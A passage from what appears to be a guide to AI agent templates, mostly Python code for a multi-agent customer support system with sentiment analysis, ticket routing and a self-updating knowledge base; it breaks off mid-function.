2. **Threat Intelligence Integration**: Automated enrichment of indicators with reputation data
3. **MITRE ATT&CK Mapping**: Structured identification of attack techniques
4. **Risk-Based Prioritization**: Severity assessment to focus on the most critical issues
5. **Actionable Remediation**: Clear, prioritized steps for different incident response phases

### AI Customer Support Automation (Intelligent Chatbot & Sentiment Analysis)

This AI agent template is designed to handle customer support interactions, providing intelligent responses, routing complex issues to specialists, and analyzing customer sentiment. It provides a complete customer support solution with continuous learning capabilities.

**Core Capabilities:**
- Natural conversation handling with context awareness
- Knowledge base integration for accurate responses
- Sentiment analysis and customer satisfaction tracking
- Ticket categorization and priority assignment
- Specialist routing for complex issues
- Continuous improvement through feedback loops

**Architecture:**

![Customer Support Automation Architecture](https://i.imgur.com/aqM4WfB.png)

**Implementation Example:**

```python
# customer_support_agent.py
import os
import json
import datetime
import uuid
import pandas as pd
import numpy as np
import autogen
import openai
import re
import logging
from typing import Dict, List, Any, Optional, Union, Tuple

# Configure API keys and settings
OPENAI_API_KEY = os.environ.get("OPENAI_API_KEY", "your-api-key")

# Initialize OpenAI client
client = openai.OpenAI(api_key=OPENAI_API_KEY)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("customer_support.log"),
        logging.StreamHandler()
    ]
)

logger = logging.getLogger("customer_support_agent")

class CustomerSupportAgent:
    """
    An AI-powered customer support agent that handles customer inquiries,
    analyzes sentiment, and routes complex issues to specialists.
    """
    
    def __init__(self, config=None):
        """
        Initialize the Customer Support Agent.
        
        Args:
            config: Optional configuration dictionary with settings
        """
        self.config = config or {}
        
        # Knowledge base file path
        self.knowledge_base_path = self.config.get("knowledge_base_path", "knowledge_base.json")
        
        # Load knowledge base if it exists, otherwise create an empty one
        self.knowledge_base = self._load_knowledge_base()
        
        # Customer conversation history
        self.conversation_history = {}
        
        # Load conversation history if available
        self.history_path = self.config.get("history_path", "conversation_history.json")
        if os.path.exists(self.history_path):
            try:
                with open(self.history_path, 'r') as f:
                    self.conversation_history = json.load(f)
            except Exception as e:
                logger.error(f"Error loading conversation history: {e}")
        
        # Set up agent configuration
        self.llm_config = {
            "config_list": [{"model": "gpt-4-turbo", "api_key": OPENAI_API_KEY}],
            "temperature": 0.7,
            "timeout": 60
        }
        
        # Create the agent team
        self._create_agent_team()
        
        # Ticket system
        self.tickets = {}
        
        # Load tickets if available
        self.tickets_path = self.config.get("tickets_path", "support_tickets.json")
        if os.path.exists(self.tickets_path):
            try:
                with open(self.tickets_path, 'r') as f:
                    self.tickets = json.load(f)
            except Exception as e:
                logger.error(f"Error loading tickets: {e}")
    
    def _load_knowledge_base(self) -> Dict:
        """
        Load the knowledge base from a JSON file.
        
        Returns:
            Dictionary containing the knowledge base
        """
        if os.path.exists(self.knowledge_base_path):
            try:
                with open(self.knowledge_base_path, 'r') as f:
                    return json.load(f)
            except Exception as e:
                logger.error(f"Error loading knowledge base: {e}")
        
        # If file doesn't exist or has errors, initialize with empty structure
        return {
            "products": {},
            "faqs": {},
            "troubleshooting": {},
            "policies": {},
            "response_templates": {}
        }
    
    def save_knowledge_base(self):
        """Save the knowledge base to a JSON file."""
        try:
            with open(self.knowledge_base_path, 'w') as f:
                json.dump(self.knowledge_base, f, indent=2)
            logger.info("Knowledge base saved successfully")
        except Exception as e:
            logger.error(f"Error saving knowledge base: {e}")
    
    def _create_agent_team(self):
        """Create the team of specialized agents for customer support."""
        
        # 1. Front Desk Agent - First point of contact
        self.front_desk_agent = autogen.AssistantAgent(
            name="FrontDeskAgent",
            system_message="""You are a friendly and helpful front desk customer support agent. 
            You are the first point of contact for all customer inquiries.
            
            Your responsibilities:
            1. Greet customers in a friendly manner
            2. Identify the customer's core issue or request
            3. Provide immediate help for simple questions
            4. Collect relevant information for complex issues
            5. Create a positive first impression
            
            Always be polite, empathetic, and patient. Use a conversational tone while remaining professional.
            Ask clarifying questions when necessary to better understand the customer's needs.
            If you can resolve the issue immediately with your knowledge, do so. Otherwise, acknowledge
            the customer's concern and prepare to route them to a specialist.""",
            llm_config=self.llm_config
        )
        
        # 2. Technical Support Specialist - For technical problems
        self.technical_specialist = autogen.AssistantAgent(
            name="TechnicalSpecialist",
            system_message="""You are an expert technical support specialist with deep knowledge
            of all our products, services, and common technical issues.
            
            Your responsibilities:
            1. Diagnose technical problems based on customer descriptions
            2. Provide step-by-step troubleshooting guidance
            3. Explain technical concepts in user-friendly language
            4. Document technical issues for knowledge base updates
            5. Identify when escalation to engineering is needed
            
            Focus on clear, accurate instructions. Walk customers through troubleshooting steps one at a time.
            Verify each step is completed before moving to the next. Be patient with customers who may not be
            technically savvy. When providing solutions, briefly explain the cause of the issue to help customers
            understand and potentially prevent similar problems in the future.""",
            llm_config=self.llm_config
        )
        
        # 3. Billing Specialist - For payment and account issues
        self.billing_specialist = autogen.AssistantAgent(
            name="BillingSpecialist",
            system_message="""You are an expert billing and account specialist with comprehensive knowledge
            of our billing systems, subscription plans, and payment processes.
            
            Your responsibilities:
            1. Resolve billing inquiries and payment issues
            2. Explain charges, fees, and subscription details
            3. Guide customers through payment processes
            4. Assist with account status questions
            5. Handle refund and credit inquiries
            
            Be thorough and precise when discussing financial matters. Always verify account information
            before providing specific details. Explain billing concepts clearly and without technical jargon.
            Show empathy when customers are frustrated about billing issues while remaining factual and
            solution-oriented. Ensure compliance with financial regulations in all interactions.""",
            llm_config=self.llm_config
        )
        
        # 4. Product Specialist - For product-specific questions
        self.product_specialist = autogen.AssistantAgent(
            name="ProductSpecialist",
            system_message="""You are an expert product specialist with in-depth knowledge of all
            our products, features, comparisons, and use cases.
            
            Your responsibilities:
            1. Provide detailed product information and specifications
            2. Compare products and recommend options based on customer needs
            3. Explain product features and benefits
            4. Assist with product setup and configuration
            5. Address product compatibility questions
            
            Be enthusiastic and knowledgeable about our products without being pushy. Focus on
            helping customers find the right product for their specific needs. Highlight key features
            and benefits relevant to the customer's use case. Provide accurate specifications and
            honest comparisons. If you don't know a specific detail, acknowledge this rather than
            guessing.""",
            llm_config=self.llm_config
        )
        
        # 5. Customer Satisfaction Specialist - For complaints and escalations
        self.satisfaction_specialist = autogen.AssistantAgent(
            name="SatisfactionSpecialist",
            system_message="""You are an expert customer satisfaction specialist who excels at
            handling complaints, escalations, and turning negative experiences into positive ones.
            
            Your responsibilities:
            1. Address customer complaints with empathy and understanding
            2. De-escalate tense situations and resolve conflicts
            3. Find creative solutions to satisfy dissatisfied customers
            4. Identify process improvements from complaint patterns
            5. Ensure customer retention through exceptional service recovery
            
            Always validate the customer's feelings first before moving to solutions. Use phrases like
            "I understand why that would be frustrating" and "You're right to bring this to our attention."
            Take ownership of issues even if they weren't your fault. Focus on what you can do rather
            than limitations. Be generous in making things right - the lifetime value of a retained
            customer far exceeds most compensation costs.""",
            llm_config=self.llm_config
        )
        
        # 6. Support Manager - For coordinating complex cases
        self.support_manager = autogen.AssistantAgent(
            name="SupportManager",
            system_message="""You are an experienced support manager who coordinates complex
            support cases and ensures customers receive the best possible assistance.
            
            Your responsibilities:
            1. Evaluate complex customer issues and determine the best approach
            2. Coordinate between different specialist agents when needed
            3. Make executive decisions about exceptional customer service measures
            4. Ensure consistent quality of support across all interactions
            5. Identify systemic issues that need to be addressed
            
            Your focus is on ensuring exceptional customer service in complex situations. You have
            authority to approve special exceptions to policies when warranted. Coordinate the efforts
            of specialist agents to provide a seamless experience. Recognize when an issue indicates
            a larger problem that needs to be addressed. Always maintain a professional, leadership-oriented
            tone while showing genuine concern for customer satisfaction.""",
            llm_config=self.llm_config
        )
        
        # User proxy agent for orchestrating the workflow
        self.user_proxy = autogen.UserProxyAgent(
            name="CustomerServiceCoordinator",
            human_input_mode="NEVER",
            code_execution_config=False,
            system_message="""You are a coordinator for customer service interactions.
            Your role is to manage the flow of information between the customer and the specialized agents.
            You help route customer inquiries to the right specialist and ensure a smooth conversation."""
        )
    
    def analyze_sentiment(self, text: str) -> Dict[str, Any]:
        """
        Analyze the sentiment of customer messages.
        
        Args:
            text: Customer message text
            
        Returns:
            Dictionary with sentiment analysis results
        """
        try:
            # Use OpenAI to analyze sentiment
            response = client.chat.completions.create(
                model="gpt-4-turbo",
                messages=[
                    {"role": "system", "content": "You are a sentiment analysis expert. Analyze the customer message and provide a detailed sentiment assessment."},
                    {"role": "user", "content": f"Analyze the sentiment of this customer message. Return a JSON object with sentiment_score (from -1 to 1), emotion_label (angry, frustrated, neutral, satisfied, happy), urgency_level (low, medium, high), and key_issues (array of issues mentioned).\n\nCustomer message: {text}"}
                ],
                temperature=0.2,
                response_format={"type": "json_object"}
            )
            
            # Parse the response
            sentiment_analysis = json.loads(response.choices[0].message.content)
            
            return sentiment_analysis
            
        except Exception as e:
            logger.error(f"Error analyzing sentiment: {e}")
            # Return default values if analysis fails
            return {
                "sentiment_score": 0,
                "emotion_label": "neutral",
                "urgency_level": "medium",
                "key_issues": []
            }
    
    def categorize_inquiry(self, text: str) -> Dict[str, Any]:
        """
        Categorize a customer inquiry to determine routing.
        
        Args:
            text: Customer inquiry text
            
        Returns:
            Dictionary with categorization results
        """
        try:
            # Use OpenAI to categorize the inquiry
            response = client.chat.completions.create(
                model="gpt-4-turbo",
                messages=[
                    {"role": "system", "content": "You are a customer support specialist who categorizes incoming customer inquiries."},
                    {"role": "user", "content": f"Categorize this customer inquiry. Return a JSON object with primary_category (technical, billing, product, account, general, complaint), subcategory (specific issue type), priority (low, medium, high, urgent), and required_info (array of information needed to resolve).\n\nCustomer inquiry: {text}"}
                ],
                temperature=0.2,
                response_format={"type": "json_object"}
            )
            
            # Parse the response
            categorization = json.loads(response.choices[0].message.content)
            
            return categorization
            
        except Exception as e:
            logger.error(f"Error categorizing inquiry: {e}")
            # Return default values if categorization fails
            return {
                "primary_category": "general",
                "subcategory": "undefined",
                "priority": "medium",
                "required_info": []
            }
    
    def search_knowledge_base(self, query: str, category: str = None) -> List[Dict[str, Any]]:
        """
        Search the knowledge base for relevant information.
        
        Args:
            query: Search query
            category: Optional category to limit search
            
        Returns:
            List of relevant knowledge base entries
        """
        results = []
        
        try:
            # Use OpenAI to identify relevant knowledge base entries
            # First, convert our knowledge base to a string representation
            kb_text = json.dumps(self.knowledge_base, indent=2)
            
            # Prepare the prompt
            prompt = f"""Given the following knowledge base and a customer query, identify the most relevant entries that would help answer the query.
            
            KNOWLEDGE BASE:
            {kb_text}
            
            CUSTOMER QUERY:
            {query}
            
            Return a JSON array of the most relevant entries, with each object containing:
            1. category: The category in the knowledge base
            2. key: The specific key within that category
            3. relevance_score: A score from 0-1 indicating how relevant this entry is to the query
            4. reasoning: Brief explanation of why this is relevant
            
            Only include entries with relevance_score > 0.7. Limit to the top 3 most relevant entries.
            """
            
            # Get response from OpenAI
            response = client.chat.completions.create(
                model="gpt-4-turbo",
                messages=[
                    {"role": "system", "content": "You are a knowledge base search specialist who identifies the most relevant information to address customer queries."},
                    {"role": "user", "content": prompt}
                ],
                temperature=0.2,
                response_format={"type": "json_object"}
            )
            
            # Parse the response
            search_results = json.loads(response.choices[0].message.content)
            
            # Extract the actual content for each result
            if "results" in search_results:
                search_results = search_results["results"]
            
            for result in search_results:
                category = result.get("category")
                key = result.get("key")
                
                if category in self.knowledge_base and key in self.knowledge_base[category]:
                    content = self.knowledge_base[category][key]
                    results.append({
                        "category": category,
                        "key": key,
                        "content": content,
                        "relevance_score": result.get("relevance_score", 0.7),
                        "reasoning": result.get("reasoning", "")
                    })
            
            return results
            
        except Exception as e:
            logger.error(f"Error searching knowledge base: {e}")
            return []
    
    def create_support_ticket(self, customer_id: str, inquiry: str, category: str, priority: str) -> Dict[str, Any]:
        """
        Create a support ticket for a customer inquiry.
        
        Args:
            customer_id: Unique customer identifier
            inquiry: Customer inquiry text
            category: Issue category
            priority: Issue priority
            
        Returns:
            Dictionary with ticket information
        """
        # Generate a unique ticket ID
        ticket_id = f"TICKET-{uuid.uuid4().hex[:8]}"
        
        # Analyze sentiment
        sentiment = self.analyze_sentiment(inquiry)
        
        # Create the ticket
        ticket = {
            "ticket_id": ticket_id,
            "customer_id": customer_id,
            "created_at": datetime.datetime.now().isoformat(),
            "updated_at": datetime.datetime.now().isoformat(),
            "status": "open",
            "category": category,
            "subcategory": "",
            "priority": priority,
            "inquiry": inquiry,
            "sentiment": sentiment,
            "agent_assigned": None,
            "resolution": None,
            "resolution_time": None,
            "feedback": None,
            "satisfaction_score": None,
            "history": [
                {
                    "timestamp": datetime.datetime.now().isoformat(),
                    "action": "ticket_created",
                    "details": "Ticket created from customer inquiry"
                }
            ]
        }
        
        # Store the ticket
        self.tickets[ticket_id] = ticket
        
        # Save tickets to disk
        self._save_tickets()
        
        return ticket
    
    def _save_tickets(self):
        """Save support tickets to a JSON file."""
        try:
            with open(self.tickets_path, 'w') as f:
                json.dump(self.tickets, f, indent=2)
            logger.info("Support tickets saved successfully")
        except Exception as e:
            logger.error(f"Error saving support tickets: {e}")
    
    def update_ticket(self, ticket_id: str, updates: Dict[str, Any]) -> Dict[str, Any]:
        """
        Update an existing support ticket.
        
        Args:
            ticket_id: Ticket identifier
            updates: Dictionary of fields to update
            
        Returns:
            Updated ticket information
        """
        if ticket_id not in self.tickets:
            logger.error(f"Ticket {ticket_id} not found")
            return None
        
        # Get the existing ticket
        ticket = self.tickets[ticket_id]
        
        # Update fields
        for key, value in updates.items():
            if key != "history" and key != "ticket_id":
                ticket[key] = value
        
        # Add history entry
        history_entry = {
            "timestamp": datetime.datetime.now().isoformat(),
            "action": "ticket_updated",
            "details": f"Updated fields: {', '.join(updates.keys())}"
        }
        ticket["history"].append(history_entry)
        
        # Update the updated_at timestamp
        ticket["updated_at"] = datetime.datetime.now().isoformat()
        
        # Save the updated ticket
        self.tickets[ticket_id] = ticket
        self._save_tickets()
        
        return ticket
    
    def close_ticket(self, ticket_id: str, resolution: str, satisfaction_score: Optional[int] = None) -> Dict[str, Any]:
        """
        Close a support ticket with resolution.
        
        Args:
            ticket_id: Ticket identifier
            resolution: Resolution description
            satisfaction_score: Optional customer satisfaction score (1-5)
            
        Returns:
            Closed ticket information
        """
        if ticket_id not in self.tickets:
            logger.error(f"Ticket {ticket_id} not found")
            return None
        
        # Get the existing ticket
        ticket = self.tickets[ticket_id]
        
        # Calculate resolution time
        created_at = datetime.datetime.fromisoformat(ticket["created_at"])
        closed_at = datetime.datetime.now()
        resolution_time_seconds = (closed_at - created_at).total_seconds()
        
        # Update ticket
        updates = {
            "status": "closed",
            "resolution": resolution,
            "resolution_time": resolution_time_seconds,
            "updated_at": closed_at.isoformat()
        }
        
        if satisfaction_score is not None:
            updates["satisfaction_score"] = satisfaction_score
        
        # Add history entry
        history_entry = {
            "timestamp": closed_at.isoformat(),
            "action": "ticket_closed",
            "details": f"Ticket closed with resolution: {resolution}"
        }
        
        # Apply updates
        for key, value in updates.items():
            ticket[key] = value
        
        ticket["history"].append(history_entry)
        
        # Save the updated ticket
        self.tickets[ticket_id] = ticket
        self._save_tickets()
        
        # Extract learnings from this ticket
        self._extract_knowledge_from_ticket(ticket)
        
        return ticket
    
    def _extract_knowledge_from_ticket(self, ticket: Dict[str, Any]):
        """
        Extract knowledge from a resolved ticket to improve the knowledge base.
        
        Args:
            ticket: Resolved support ticket
        """
        # Only process closed tickets with resolutions
        if ticket["status"] != "closed" or not ticket["resolution"]:
            return
        
        try:
            # Prepare the prompt for knowledge extraction
            prompt = f"""Analyze this resolved support ticket and identify any knowledge that should be added to our knowledge base.

TICKET DETAILS:
Inquiry: {ticket['inquiry']}
Category: {ticket['category']}
Resolution: {ticket['resolution']}

Extract the following:
1. What key information helped resolve this issue?
2. Is this a common issue that should be added to FAQs or troubleshooting?
3. What category in the knowledge base would this information belong to?
4. What key/title would be appropriate for this entry?
5. What content should be included?

Return as a JSON object with suggested_category, suggested_key, suggested_content, and confidence (0-1) indicating how strongly you believe this should be added to the knowledge base.
"""
            
            # Get response from OpenAI
            response = client.chat.completions.create(
                model="gpt-4-turbo",
                messages=[
                    {"role": "system", "content": "You are a knowledge management specialist who extracts valuable information from support interactions to improve knowledge bases."},
                    {"role": "user", "content": prompt}
                ],
                temperature=0.3,
                response_format={"type": "json_object"}
            )
            
            # Parse the response
            knowledge = json.loads(response.choices[0].message.content)
            
            # Only add to knowledge base if confidence is high enough
            if knowledge.get("confidence", 0) >= 0.8:
                category = knowledge.get("suggested_category")
                key = knowledge.get("suggested_key")
                content = knowledge.get("suggested_content")
                
                if category and key and content:
                    # Ensure category exists
                    if category not in self.knowledge_base:
                        self.knowledge_base[category] = {}
                    
                    # Add the new knowledge
                    self.knowledge_base[category][key] = content
                    
                    # Save the updated knowledge base
                    self.save_knowledge_base()
                    
                    logger.info(f"Added new knowledge to {category}/{key} from ticket {ticket['ticket_id']}")
        
        except Exception as e:
            logger.error(f"Error extracting knowledge from ticket: {e}")
    
    def route_to_specialist(self, inquiry: str, customer_id: str = "anonymous") -> Dict[str, Any]:
        """
        Route a customer inquiry to the appropriate specialist based on content.
        
        Args:
            inquiry: Customer inquiry text
            customer_id: Optional customer identifier
            
        Returns:
            Dictionary with routing results
        """
        # Categorize the inquiry
        categorization = self.categorize_inquiry(inquiry)
        
        # Create a support ticket
        ticket = self.create_support_ticket(
            customer_id=customer_id,
            inquiry=inquiry,
            category=categorization.get("primary_category", "general"),
            priority=categorization.get("priority", "medium")
        )
        
        # Map primary category to specialist agent
        specialist_mapping = {
            "technical": self.technical_specialist,
            "billing": self.billing_specialist,
            "product": self.product_specialist,
            "complaint": self.satisfaction_specialist,
            "general": self.front_desk_agent
        }
        
        # Get the appropriate specialist
        primary_category = categorization.get("primary_category", "general")
        specialist = specialist_mapping.get(primary_category, self.front_desk_agent)
        
        # Update ticket with assigned agent
        self.update_ticket(
            ticket_id=ticket["ticket_id"],
            updates={"agent_assigned": specialist.name}
        )
        
        return {
            "ticket_id": ticket["ticket_id"],
            "specialist": specialist.name,
            "category": primary_category,
            "subcategory": categorization.get("subcategory", ""),
            "priority": categorization.get("priority", "medium")
        }
    
    def handle_customer_message(self, message: str, customer_id: str = "anonymous", conversation_id: str = None) -> Dict[str, Any]:
        """
        Handle a customer message with the appropriate agent.
        
        Args:
            message: Customer message text
            customer_id: Optional customer identifier
            conversation_id: Optional conversation identifier
            
        Returns:
            Dictionary with response and metadata
        """
        # Generate conversation ID if not provided
        if not conversation_id:
            conversation_id = f"CONV-{uuid.uuid4().hex[:8]}"
        
        # Initialize conversation history if needed
        if conversation_id not in self.conversation_history:
            self.conversation_history[conversation_id] = {
                "customer_id": customer_id,
                "created_at": datetime.datetime.now().isoformat(),
                "updated_at": datetime.datetime.now().isoformat(),
                "messages": [],
                "sentiment_trend": [],
                "active_ticket_id": None
            }
        
        # Analyze sentiment
        sentiment = self.analyze_sentiment(message)
        
        # Update sentiment trend
        self.conversation_history[conversation_id]["sentiment_trend"].append({
            "timestamp": datetime.datetime.now().isoformat(),
            "sentiment_score": sentiment.get("sentiment_score", 0),
            "emotion_label": sentiment.get("emotion_label", "neutral")
        })
        
        # Add customer message to history
        self.conversation_history[conversation_id]["messages"].append({
            "timestamp": datetime.datetime.now().isoformat(),
            "sender": "customer",
            "message": message,
            "sentiment": sentiment
        })
        
        # Update timestamp
        self.conversation_history[conversation_id]["updated_at"] = datetime.datetime.now().isoformat()
        
        # Check if we need to create or update a ticket
        active_ticket_id = self.conversation_history[conversation_id].get("active_ticket_id")
        
        if not active_ticket_id:
            # Route to specialist and create ticket
            routing = self.route_to_specialist(message, customer_id)
            active_ticket_id = routing.get("ticket_id")
            specialist_name = routing.get("specialist")
            
            # Update conversation with ticket ID
            self.conversation_history[conversation_id]["active_ticket_id"] = active_ticket_id
            
            # Select the appropriate specialist agent
            if specialist_name == "TechnicalSpecialist":
                specialist = self.technical_specialist
            elif specialist_name == "BillingSpecialist":
                specialist = self.billing_specialist
            elif specialist_name == "ProductSpecialist":
                specialist = self.product_specialist
            elif specialist_name == "SatisfactionSpecialist":
                specialist = self.satisfaction_specialist
            else:
                specialist = self.front_desk_agent
        else:
            # Get the existing ticket
            ticket = self.tickets.get(active_ticket_id)
            
            if ticket:
                specialist_name = ticket.get("agent_assigned", "FrontDeskAgent")
                
                # Select the appropriate specialist agent
                if specialist_name == "TechnicalSpecialist":
                    specialist = self.technical_specialist
                elif specialist_name == "BillingSpecialist":
                    specialist = self.billing_specialist
                elif specialist_name == "ProductSpecialist":
                    specialist = self.product_specialist
                elif specialist_name == "SatisfactionSpecialist":
                    specialist = self.satisfaction_specialist
                else:
                    specialist = self.front_desk_agent
                
                # Update ticket with latest message
                self.update_ticket(
                    ticket_id=active_ticket_id,
                    updates={
                        "history": ticket["history"] + [{
                            "timestamp": datetime.datetime.now().isoformat(),
                            "action": "customer_message",
                            "details": f"Customer message: {message[:100]}..." if len(message) > 100 else message
                        }]
                    }
                )
            else:
                # Ticket not found, use front desk agent
                specialist = self.front_desk_agent
        
        # Search knowledge base for relevant information
        knowledge_results = self.search_knowledge_base(message)
        
        # Create context from conversation history
        context = self._prepare_conversation_context(conversation_id)
        
        # Generate the prompt for the specialist
        knowledge_context = ""
        if knowledge_results:
            knowledge_context = "Relevant knowledge base entries:\n"
            for i, entry in enumerate(knowledge_results, 1):
                knowledge_context += f"{i}. {entry['category']} - {entry['key']}:\n{entry['content']}\n\n"
        
        prompt = f"""
        You are responding to a customer inquiry. Use the conversation history and knowledge base to provide a helpful response.
        
        CONVERSATION HISTORY:
        {context}
        
        CURRENT CUSTOMER MESSAGE:
        {message}
        
        {knowledge_context if knowledge_context else ""}
        
        CUSTOMER SENTIMENT:
        Sentiment Score: {sentiment.get('sentiment_score', 0)}
        Emotion: {sentiment.get('emotion_label', 'neutral')}
        Urgency: {sentiment.get('urgency_level', 'medium')}
        
        Please provide a helpful, accurate response that addresses the customer's needs. Be empathetic and solution-oriented.
        If you need more information to properly help the customer, politely ask for the specific details you need.
        """
        
        # Get response from the specialist
        response = client.chat.completions.create(
            model="gpt-4-turbo",
            messages=[
                {"role": "system", "content": specialist.system_message},
                {"role": "user", "content": prompt}
            ],
            temperature=0.7,
            max_tokens=1000
        )
        
        agent_response = response.choices[0].message.content
        
        # Add agent response to conversation history
        self.conversation_history[conversation_id]["messages"].append({
            "timestamp": datetime.datetime.now().isoformat(),
            "sender": "agent",
            "agent": specialist.name,
            "message": agent_response
        })
        
        # Save conversation history
        self._save_conversation_history()
        
        # Check if the issue is resolved
        resolved = self._check_if_resolved(agent_response)
        if resolved and active_ticket_id:
            self.close_ticket(
                ticket_id=active_ticket_id,
                resolution=f"Resolved by {specialist.name}: {resolved.get('resolution_summary', 'Issue addressed')}"
            )
            # Clear active ticket from conversation
            self.conversation_history[conversation_id]["active_ticket_id"] = None
        
        return {
            "response": agent_response,
            "agent": specialist.name,
            "conversation_id": conversation_id,
            "sentiment": sentiment,
            "ticket_id": active_ticket_id,
            "resolved": resolved is not None
        }
    
    def _prepare_conversation_context(self, conversation_id: str) -> str:
        """
        Prepare conversation context from history.
        
        Args:
            conversation_id: Conversation identifier
            
        Returns:
            String with formatted conversation context
        """
        if conversation_id not in self.conversation_history:
            return "No conversation history available."
        
        # Get conversation history
        conversation = self.conversation_history[conversation_id]
        messages = conversation.get("messages", [])
        
        # Format context (limiting to last 10 messages to avoid token limits)
        context = ""
        for msg in messages[-10:]:
            sender = "Customer" if msg.get("sender") == "customer" else msg.get("agent", "Agent")
            timestamp = msg.get("timestamp", "")
            message = msg.get("message", "")
            
            context += f"{sender} ({timestamp}):\n{message}\n\n"
        
        return context
    
    def _save_conversation_history(self):
        """Save conversation history to a JSON file."""
        try:
            with open(self.history_path, 'w') as f:
                json.dump(self.conversation_history, f, indent=2)
            logger.info("Conversation history saved successfully")
        except Exception as e:
            logger.error(f"Error saving conversation history: {e}")
    
    def _check_if_resolved(self, agent_response: str) -> Optional[Dict[str, Any]]:
        """
        Check if the agent response indicates the issue is resolved.
        
        Args:
            agent_response: Agent's response text
            
        Returns:
            Dictionary with resolution info if resolved, None otherwise
        """
        try:
            # Use OpenAI to determine if the issue is resolved
            prompt = f"""Analyze this customer support agent's response and determine if it indicates the customer issue has been fully resolved.

AGENT RESPONSE:
{agent_response}

Consider:
1. Does the response indicate that all customer questions/issues have been addressed?
2. Is the agent concluding the conversation or are they expecting further input?
3. Is the response a complete solution or just a step in the troubleshooting process?

Return a JSON object with:
1. is_resolved: boolean indicating if the issue appears fully resolved
2. resolution_type: "complete", "partial", or "not_resolved"
3. resolution_summary: Brief summary of the resolution if applicable
4. confidence: 0-1 score of how confident you are in this assessment
"""
            
            response = client.chat.completions.create(
                model="gpt-4-turbo",
                messages=[
                    {"role": "system", "content": "You are a customer support quality assurance specialist who evaluates if issues have been resolved."},
                    {"role": "user", "content": prompt}
                ],
                temperature=0.1,
                response_format={"type": "json_object"}
            )
            
            # Parse the response
            resolution_check = json.loads(response.choices[0].message.content)
            
            # Only consider it resolved if confidence is high and is_resolved is true
            if (resolution_check.get("is_resolved", False) and 
                resolution_check.get("confidence", 0) >= 0.8 and
                resolution_check.get("resolution_type") == "complete"):
                
                return resolution_check
            
            return None
            
        except Exception as e:
            logger.error(f"Error checking resolution: {e}")
            return None
    
    def update_knowledge_base_entry(self, category: str, key: str, content: str) -> bool:
        """
        Add or update an entry in the knowledge base.
        
        Args:
            category: Category (products, faqs, troubleshooting, policies, response_templates)
            key: Entry key/ID
            content: Entry content
            
        Returns:
            Boolean indicating success
        """
        try:
            # Ensure category exists
            if category not in self.knowledge_base:
                self.knowledge_base[category] = {}
            
            # Add or update the entry
            self.knowledge_base[category][key] = content
            
            # Save the knowledge base
            self.save_knowledge_base()
            
            logger.info(f"Updated knowledge base entry: {category}/{key}")
            return True
            
        except Exception as e:
            logger.error(f"Error updating knowledge base: {e}")
            return False
    
    def get_customer_sentiment_trend(self, customer_id: str) -> Dict[str, Any]:
        """
        Get sentiment trend for a specific customer across conversations.
        
        Args:
            customer_id: Customer identifier
            
        Returns:
            Dictionary with sentiment trend analysis
        """
        # Find all conversations for this customer
        customer_conversations = {
            conv_id: conv_data for conv_id, conv_data in self.conversation_history.items()
            if conv_data.get("customer_id") == customer_id
        }
        
        if not customer_conversations:
            return {
                "customer_id": customer_id,
                "conversations_count": 0,
                "average_sentiment": 0,
                "sentiment_trend": []
            }
        
        # Extract all sentiment data points
        all_sentiment_data = []
        for conv_id, conv_data in customer_conversations.items():
            for sentiment_entry in conv_data.get("sentiment_trend", []):
                all_sentiment_data.append({
                    "timestamp": sentiment_entry.get("timestamp"),
                    "score": sentiment_entry.get("sentiment_score", 0),
                    "emotion": sentiment_entry.get("emotion_label", "neutral"),
                    "conversation_id": conv_id
                })
        
        # Sort by timestamp
        all_sentiment_data.sort(key=lambda x: x.get("timestamp", ""))
        
        # Calculate average sentiment
        avg_sentiment = sum(entry.get("score", 0) for entry in all_sentiment_data) / len(all_sentiment_data) if all_sentiment_data else 0
        
        # Count emotion types
        emotion_counts = {}
        for entry in all_sentiment_data:
            emotion = entry.get("emotion", "neutral")
            emotion_counts[emotion] = emotion_counts.get(emotion, 0) + 1
        
        # Calculate sentiment trend over time
        trend_points = []
        if len(all_sentiment_data) > 1:
            # Group by day for longer periods
            days = {}
            for entry in all_sentiment_data:
                try:
                    date_str = entry.get("timestamp", "").split("T")[0]
                    if date_str not in days:
                        days[date_str] = []
                    days[date_str].append(entry.get("score", 0))
                except:
                    pass
            
            for date_str, scores in days.items():
                avg_score = sum(scores) / len(scores)
                trend_points.append({
                    "date": date_str,
                    "average_sentiment": avg_score
                })
            
            # Sort by date
            trend_points.sort(key=lambda x: x.get("date", ""))
        
        return {
            "customer_id": customer_id,
            "conversations_count": len(customer_conversations),
            "interactions_count": len(all_sentiment_data),
            "average_sentiment": avg_sentiment,
            "emotion_distribution": emotion_counts,
            "sentiment_trend": trend_points
        }
    
    def generate_support_insights(self) -> Dict[str, Any]:
        """
        Generate insights from support interactions.
        
        Returns:
            Dictionary with support insights
        """
        insights = {
            "tickets": {
                "total": len(self.tickets),
                "open": sum(1 for t in self.tickets.values() if t.get("status") == "open"),
                "closed": sum(1 for t in self.tickets.values() if t.get("status") == "closed"),
                "by_category": {},
                "by_priority": {},
                "avg_resolution_time": 0
            },
            "sentiment": {
                "average": 0,
                "distribution": {}
            },
            "common_issues": [],
            "knowledge_gaps": [],
            "top_performing_responses": []
        }
        
        # Calculate ticket statistics
        if self.tickets:
            # Count by category
            for ticket in self.tickets.values():
                category = ticket.get("category", "uncategorized")
                insights["tickets"]["by_category"][category] = insights["tickets"]["by_category"].get(category, 0) + 1
                
                priority = ticket.get("priority", "medium")
                insights["tickets"]["by_priority"][priority] = insights["tickets"]["by_priority"].get(priority, 0) + 1
            
            # Calculate average resolution time for closed tickets
            closed_tickets = [t for t in self.tickets.values() if t.get("status") == "closed" and t.get("resolution_time")]
            if closed_tickets:
                avg_time = sum(t.get("resolution_time", 0) for t in closed_tickets) / len(closed_tickets)
                insights["tickets"]["avg_resolution_time"] = avg_time
        
        # Calculate sentiment statistics
        all_sentiment_scores = []
        emotion_counts = {}
        
        for conv_data in self.conversation_history.values():
            for sentiment_entry in conv_data.get("sentiment_trend", []):
                score = sentiment_entry.get("sentiment_score", 0)
                all_sentiment_scores.append(score)
                
                emotion = sentiment_entry.get("emotion_label", "neutral")
                emotion_counts[emotion] = emotion_counts.get(emotion, 0) + 1
        
        if all_sentiment_scores:
            insights["sentiment"]["average"] = sum(all_sentiment_scores) / len(all_sentiment_scores)
            insights["sentiment"]["distribution"] = emotion_counts
        
        # Identify common issues and knowledge gaps
        try:
            # Use OpenAI to analyze tickets and identify patterns
            # First, prepare a summary of closed tickets
